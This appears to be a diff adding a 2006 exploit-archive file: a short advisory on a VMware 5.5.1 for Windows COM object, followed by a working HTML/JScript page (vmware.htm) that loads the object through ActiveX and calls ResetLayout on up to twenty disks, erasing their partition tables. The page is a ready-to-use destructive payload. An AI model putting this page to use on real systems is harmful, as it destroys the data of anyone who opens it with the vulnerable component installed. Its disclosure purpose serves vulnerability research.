@@ -1,0 +1,65 @@
+<!--
+
+[XSec-06-05]: VMware 5.5.1 for Windows arbitrary partition table delete issue.
+
+Advisory ID:
+XSec-06-05
+
+Advisory Name:    
+VMware 5.5.1 for Windows arbitrary partition table delete issue.
+
+Release Date:      
+08/16/2006
+
+Tested on:        
+VMware 5.5.1 build-19175 on Windows Server 2000/2003
+
+Affected version:  
+VMware 5.5.1
+
+Author:
+nop <nop#xsec.org>
+http://www.xsec.org
+
+Overview:
+ On running windows system, you can't delete, format and change system dirver. \
+VMware register a COM Object use for Virtual Disk, but it's very danger. \
+I don't know how to name this issue. If you allow unsafe ActiveX and jscript, \
+and has VMware installed, the vmware.htm will delete all harddisk partition \
+table on the windows system. please backup your partition table first.
+
+Exploit:
+
+=============== vmware.htm start ================
+
+
+// VMware 5.5.1 for Windows arbitrary partition table delete issue.
+// Tested on Windows Server 2000/2003
+//
+// nop nop#xsec.org
+// http://www.xsec.org
+//
+
+// CLSID: {0F748FDE-0597-443C-8596-71854C5EA20A}
+// Info: Vie2Locator Class
+// ProgID: VieLib2.Vie2Locator.1
+// InprocServer32: C:\Program Files\Common Files\VMware\VMware Virtual Image Editing\vielib.dll
+
+-->
+
+<html><body>
+<object classid="clsid:{0F748FDE-0597-443C-8596-71854C5EA20A}" id="vmware"> </object>
+<script>
+
+var disk = 0;                              // HardDisk No
+
+while (disk < 20)
+{
+    var x = vmware.ConnectDisk(disk);  // Connect to HardDisk
+    x.ResetLayout();                   // Will clean all partition table on your Harddisk
+       disk += 1;
+}
+</script>
+</body></html>
+
+# milw0rm.com [2006-08-16]
